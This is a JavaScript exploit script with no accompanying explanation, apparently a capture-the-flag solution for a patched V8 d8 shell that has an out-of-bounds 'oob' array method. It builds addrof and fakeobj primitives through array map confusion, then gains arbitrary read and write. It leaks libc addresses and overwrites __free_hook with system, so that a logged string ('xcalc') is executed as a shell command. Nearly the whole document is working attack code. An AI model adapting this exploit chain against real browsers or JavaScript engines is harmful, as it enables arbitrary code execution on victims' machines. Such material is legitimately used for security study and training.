var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64buf = new Uint32Array(buf);

function ftoi(val){
	f64_buf[0] = val;
	return BigInt(u64buf[0]) + (BigInt(u64buf[1]) << 32n);
}

function itof(val){
	u64buf[0] = Number(val & 0xffffffffn);
	u64buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

/// Construct addrof primitive
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var craf = [1.1, 1.2, 1.3, 1.4]
var map1 = obj_arr.oob();
var map2 = float_arr.oob();

function addrof(obj){
	// Set the object address to leak
	obj_arr[0] = obj;

	// Set the obj array map to float array map
	obj_arr.oob(map2);

	let addr = obj_arr[0];

	// make things normal again
	obj_arr.oob(map1);
	return ftoi(addr);
}

function fakeobj(addr){
	// keep the address in the first index
	float_arr[0] = itof(addr);

	// Change the float type to obj type
	float_arr.oob(map1);

	// Get a fake object at that memory
	let fake = float_arr[0];

	// back to normal
	float_arr.oob(map2);
	return fake;
}

var fake = [1.1]
function arb_read(toleak){
	
	craf[0] = craf.oob(); 	// map
	craf[1] = 0;		 	// properties
	craf[2] = itof(BigInt(toleak) - 0x10n); // elements
	
	fake = fakeobj(addrof(craf) - 0x20n );

	return ftoi(fake[0]);
}

function initial_write(addr, val){
	
	craf[0] = craf.oob(); 	// map
	craf[1] = 0;		 	// properties
	craf[2] = itof(BigInt(addr) - 0x10n); // elements
	
	fake = fakeobj(addrof(craf) - 0x20n );

	fake[0] = itof(BigInt(val));
}

var buf = new ArrayBuffer(8);
var dat = new DataView(buf);
function arb_write(addr, val){
	initial_write((addrof(buf) + 0x20n), addr);
	dat.setBigInt64(0, BigInt(val), true); // little endian
}

/* Main Exploit */

// Libc leak
var test = [1.1, 1.2, 1.3, 1.4];

var code = arb_read(addrof(test.constructor) + 0x30n);
var d8_addr = arb_read(code + 0x42n);
var libc = arb_read(d8_addr+0x2c4ed9n);
var free_hook = libc + 0x36cf78n
var system = libc - 0x31550n

console.log("[+] libc addres: " + libc.toString(16));
console.log("[+] system addres: " + system.toString(16));
console.log("[+] free_hook addres: " + free_hook.toString(16));

arb_write(free_hook, system);

// calling free with the heap address
console.log("xcalc")